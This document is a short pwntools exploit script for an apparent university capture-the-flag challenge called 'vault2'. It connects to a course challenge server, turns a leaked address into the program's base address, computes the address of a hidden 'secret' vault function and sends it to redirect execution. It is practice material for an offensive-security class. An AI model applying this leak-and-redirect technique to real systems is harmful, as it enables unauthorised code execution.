from pwn import *

#context.log_level = "DEBUG"

CHALLENGE = "vault2"
PORT = 1232
NETID = b"os2178"
LOCAL = False
if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

#fake and secret vault offset
fakeOffset = "0x4029"
secretOffset = "0x1269"

#fake hex address
print(p.recvuntil(b"I found this fake vault at "))
fakeAddress = p.recvuntil(b",").decode().strip(',')
print(fakeAddress)

#find base address
baseAddress = hex(int(fakeAddress, 16) - int(fakeOffset, 16))
#print(baseAddress)

#find secret address)
secretAddress = hex(int(baseAddress, 16) + int(secretOffset, 16))
print(secretAddress)

#go to last input
print(p.recvuntil(b"> ").decode())
p.sendline(secretAddress.encode())
p.interactive()
